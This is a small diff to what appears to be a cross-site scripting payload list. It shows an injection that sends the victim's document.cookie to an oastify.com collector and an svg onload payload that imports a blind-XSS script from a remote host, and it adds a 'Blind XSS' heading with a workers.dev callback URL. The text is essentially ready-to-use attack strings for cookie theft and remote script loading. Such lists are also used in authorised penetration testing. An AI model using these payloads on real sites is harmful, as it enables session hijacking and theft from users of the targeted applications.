@@ -31,5 +31,8 @@ payload
 \\"-fetch('https://er9q2scjsandq0qk5espe78bt2ztnubj.oastify.com?reflects='+window['document']['cookie'])}//
 <svg/onload=import('//EXPLOIT.net/blind_xss')>    - blind xss
 
+Blind XSS
+https://aged-cloud-b431.0days.workers.dev/
+
 
 
